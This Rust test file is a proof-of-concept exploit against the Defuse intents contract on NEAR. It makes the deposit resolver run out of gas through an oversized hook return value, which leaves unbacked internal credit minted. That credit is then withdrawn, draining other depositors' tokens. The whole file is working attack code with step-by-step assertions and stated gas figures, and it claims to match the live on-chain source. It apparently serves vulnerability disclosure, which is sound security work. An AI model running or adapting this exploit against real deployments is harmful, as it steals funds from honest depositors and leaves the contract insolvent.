//! PoC: deposit-resolver gas exhaustion mints unbacked internal credit.
//!
//! Runs against the Defuse wasm built from the live intents.near source
//! snapshot (fa44ede9, v0.4.2-hotfix, on-chain code hash HUJ89jxF...) and
//! the test-suite PoA token, which wraps the reference NEP-141
//! implementation (near-contract-standards FungibleToken). No state
//! patches; the attack is two ordinary transactions.

#![allow(clippy::print_stdout)]

use crate::tests::defuse::env::Env;
use crate::tests::defuse::tokens::nep141::traits::DefuseFtWithdrawer;
use crate::utils::ft::FtExt;
use crate::utils::mt::MtExt;
use defuse::core::intents::tokens::NotifyOnTransfer;
use defuse::core::token_id::TokenId;
use defuse::core::token_id::nep141::Nep141TokenId;
use defuse::tokens::{DepositAction, DepositMessage};
use multi_token_receiver_stub::MTReceiverMode;
use near_sdk::NearToken;
use near_sdk::json_types::U128;
use serde_json::json;

/// Honest depositor's balance (internal claims are 1:1 backed before attack).
const VICTIM_AMOUNT: u128 = 1_000_000;
/// Attacker deposits (and re-extracts) this much per round.
const ATTACK_AMOUNT: u128 = 1_000_000;
/// Hook return payload: 40_000 × u128::MAX ≈ 1.72 MB JSON — under the 4 MB
/// return-value cap (delivered as a Successful promise result) yet costing
/// ≈ 2.87 Ggas + 3,801,564 gas/B × 1.72 MB ≈ 6.5 Tgas to receive inside the
/// host promise_result syscall, more than the resolver's 6 Tgas budget.
const OVERSIZED_COUNT: usize = 40_000;

/// Internal (NEP-245-style) balance of `owner` inside Defuse for `token_id`.
async fn internal_balance(
    env: &Env,
    owner: &near_sdk::AccountId,
    token_id: &str,
) -> anyhow::Result<u128> {
    env.mt_contract_balance_of(env.defuse.id(), owner, &token_id.to_string())
        .await
}

#[tokio::test]
async fn poc_deposit_resolver_oog_mints_unbacked_credit() -> anyhow::Result<()> {
    println!("=== PoC: deposit-resolver OOG => unbacked internal credit (local) ===");

    // ---- real local Defuse (live source snapshot), reference NEP-141 token, users
    let env = Env::builder().build().await;

    let (attacker, victim) = futures::join!(env.create_user(), env.create_user());
    let ft = env.create_token().await;
    let hook = env.deploy_mt_receiver_stub().await;

    env.initial_ft_storage_deposit(vec![attacker.id(), victim.id(), hook.id()], vec![&ft])
        .await;

    // attacker funds themselves; victim makes an honest deposit
    env.ft_transfer(&ft, attacker.id(), ATTACK_AMOUNT, None).await?;
    env.defuse_ft_deposit_to(&ft, VICTIM_AMOUNT, victim.id(), None)
        .await?;

    let ft_id = TokenId::from(Nep141TokenId::new(ft.clone())).to_string();

    // ---- BEFORE snapshot: claims are 1:1 backed
    let holdings_before = env.ft_token_balance_of(&ft, env.defuse.id()).await?;
    let attacker_before = env.ft_token_balance_of(&ft, attacker.id()).await?;
    let victim_internal = internal_balance(&env, victim.id(), &ft_id).await?;
    assert_eq!(attacker_before, ATTACK_AMOUNT);
    assert_eq!(holdings_before, VICTIM_AMOUNT);
    assert_eq!(victim_internal, VICTIM_AMOUNT);
    println!("[before] Defuse holdings          : {holdings_before}");
    println!("[before] internal claims (victim) : {victim_internal}");
    println!("[before] attacker external        : {attacker_before}");

    // ============ ATTACK: one plain ft_transfer_call ============
    let hook_msg =
        serde_json::to_string(&MTReceiverMode::OversizedReturn { count: OVERSIZED_COUNT })?;
    let deposit_msg = DepositMessage::new(hook.id().clone())
        .with_action(DepositAction::Notify(NotifyOnTransfer::new(hook_msg)));

    println!("--- ATTACK: deposit {ATTACK_AMOUNT} with Notify; hook returns {OVERSIZED_COUNT}×u128::MAX (~1.7 MB) ---");
    let tx = attacker
        .call(&ft, "ft_transfer_call")
        .args_json(json!({
            "receiver_id": env.defuse.id(),
            "amount": U128(ATTACK_AMOUNT),
            "memo": null,
            "msg": deposit_msg.to_string(),
        }))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact()
        .await?;

    // ---- per-receipt trace: proves WHICH receipts committed state and which
    // one died. NEAR has no cross-receipt revert — each receipt commits
    // independently, and a failed receipt only rolls back its own writes
    // (the resolver dies inside its very first host call, before writing).
    // Printed BEFORE any assertion so the full trace is visible even on a
    // fixed node, where the resolver no longer runs out of gas and the first
    // assertion below is the one that trips.
    println!("--- ATTACK TX: per-receipt trace ---");
    for (i, r) in tx.receipt_outcomes().iter().enumerate() {
        println!(
            "receipt[{i}] executor={} success={} gas_burnt={:?}",
            r.executor_id,
            r.is_success(),
            r.gas_burnt
        );
        for l in &r.logs {
            println!("          log: {l}");
        }
    }

    // mechanism evidence: the deposit resolver receipt must have died of gas
    // exhaustion while everything else (incl. the token's own resolver)
    // executed normally
    for f in tx.failures() {
        println!("[attack] FAILED receipt: {f:?}");
    }
    let failures_debug = format!("{:?}", tx.failures()).to_lowercase();
    assert!(
        !tx.failures().is_empty(),
        "no receipt failed — the resolver did NOT run out of gas, attack shape wrong"
    );
    assert!(
        failures_debug.contains("exceed") || failures_debug.contains("gas"),
        "expected the resolver to die of gas exhaustion, got: {failures_debug}"
    );
    assert!(
        tx.is_success(),
        "transaction as a whole should succeed (final receipt is the token resolver)"
    );

    // (a) the hook's internal credit was minted by a SUCCESSFUL receipt
    // (`ft_on_transfer` emitted mt_mint crediting the hook) — i.e. the mint
    // is committed state, NOT reverted by the later resolver failure
    let mint_receipt = tx
        .receipt_outcomes()
        .iter()
        .find(|r| {
            r.logs.iter().any(|l| {
                l.contains("mt_mint") && l.contains(hook.id().as_str())
            })
        })
        .expect("no mt_mint event crediting the hook found");
    assert!(
        mint_receipt.is_success(),
        "the receipt that minted the hook's credit FAILED — PoC would be invalid"
    );
    assert_eq!(mint_receipt.executor_id, *env.defuse.id());

    // (b) the hook's mt_on_transfer itself SUCCEEDED (so its ≤4 MB return
    // value is a Successful promise result — the >4 MB case would arrive as
    // Failed and be handled safely, which is why the size matters)
    let hook_receipt = tx
        .receipt_outcomes()
        .iter()
        .find(|r| r.logs.iter().any(|l| l.contains("STUB::mt_on_transfer")))
        .expect("hook mt_on_transfer receipt not found");
    assert!(
        hook_receipt.is_success(),
        "hook receipt failed — payload never delivered as Successful data"
    );
    assert_eq!(hook_receipt.executor_id, *hook.id());

    // (c) NO refund burn ever executed in the attack tx — the resolver died
    // before `resolve_deposit_internal` could burn the hook's credit
    assert!(
        !tx.logs().iter().any(|l| l.contains("mt_burn")),
        "an mt_burn event executed during the attack — the refund burn was NOT skipped"
    );

    // (d) the token's own (successful) resolver refunded the attacker with a
    // real ft_transfer carrying memo "refund"
    let refund_receipt = tx
        .receipt_outcomes()
        .iter()
        .find(|r| {
            r.is_success()
                && r.logs.iter().any(|l| {
                    l.contains("\"event\":\"ft_transfer\"")
                        && l.contains("\"memo\":\"refund\"")
                        && l.contains(attacker.id().as_str())
                })
        })
        .expect("token refund event not found");
    assert_eq!(refund_receipt.executor_id, ft);

    // (e) exactly one receipt failed, and it is Defuse's deposit resolver
    let failed: Vec<_> = tx
        .receipt_outcomes()
        .iter()
        .filter(|r| !r.is_success())
        .collect();
    assert_eq!(failed.len(), 1, "expected exactly one failed receipt");
    assert_eq!(
        failed[0].executor_id, *env.defuse.id(),
        "the failed receipt must be Defuse's ft_resolve_deposit"
    );

    // ---- AFTER attack snapshot: the unbacked mint
    let attacker_after = env.ft_token_balance_of(&ft, attacker.id()).await?;
    let holdings_after = env.ft_token_balance_of(&ft, env.defuse.id()).await?;
    let hook_internal = internal_balance(&env, hook.id(), &ft_id).await?;
    println!("[after attack] attacker external : {attacker_after} (expect {ATTACK_AMOUNT} — fully refunded)");
    println!("[after attack] Defuse holdings   : {holdings_after} (expect unchanged {holdings_before})");
    println!("[after attack] hook internal     : {hook_internal} (expect {ATTACK_AMOUNT} — UNBACKED)");

    assert_eq!(
        attacker_after, ATTACK_AMOUNT,
        "token did not refund the attacker — attacker not externally whole"
    );
    assert_eq!(
        holdings_after, holdings_before,
        "contract holdings changed during the attack round"
    );
    assert_eq!(
        hook_internal, ATTACK_AMOUNT,
        "unbacked internal credit was NOT minted — exploit failed"
    );

    // internal supply now exceeds real backing by exactly ATTACK_AMOUNT
    let claims = victim_internal + hook_internal;
    assert!(
        holdings_after < claims,
        "solvency broken: claims {claims} vs holdings {holdings_after}"
    );

    // ---- WITHDRAW: convert unbacked credit into real tokens
    println!("--- WITHDRAW: hook converts unbacked credit into real tokens ---");
    let withdrawn = hook
        .defuse_ft_withdraw(env.defuse.id(), &ft, attacker.id(), ATTACK_AMOUNT, None, None)
        .await?;
    assert_eq!(withdrawn, ATTACK_AMOUNT);

    // ---- FINAL snapshot: other depositors' backing was stolen
    let attacker_final = env.ft_token_balance_of(&ft, attacker.id()).await?;
    let holdings_final = env.ft_token_balance_of(&ft, env.defuse.id()).await?;
    let hook_final = internal_balance(&env, hook.id(), &ft_id).await?;
    let victim_final_claim = internal_balance(&env, victim.id(), &ft_id).await?;

    println!("==================== PoC RESULT ====================");
    println!("attacker external USDC  start -> end : {attacker_before} -> {attacker_final} (net +{})",
        attacker_final - attacker_before);
    println!("Defuse real holdings    start -> end : {holdings_before} -> {holdings_final} (drained {ATTACK_AMOUNT})");
    println!("hook internal credit    after mint   : {hook_internal} -> {hook_final} after withdraw");
    println!("victim internal claim (untouched)    : {victim_final_claim} vs real backing {holdings_final}");
    println!("contract is INSOLVENT by             : {}", victim_final_claim.saturating_sub(holdings_final));
    println!("repeatable: each round extracts {ATTACK_AMOUNT} at the cost of gas");
    println!("====================================================");

    assert_eq!(attacker_final, ATTACK_AMOUNT * 2, "attacker did not extract the stolen tokens");
    assert_eq!(holdings_final, holdings_before - ATTACK_AMOUNT, "contract was not drained");
    assert_eq!(hook_final, 0);
    assert_eq!(victim_final_claim, VICTIM_AMOUNT, "victim claim should be untouched");
    assert!(
        holdings_final < victim_final_claim,
        "honest depositors' claims are no longer fully backed"
    );
    Ok(())
}
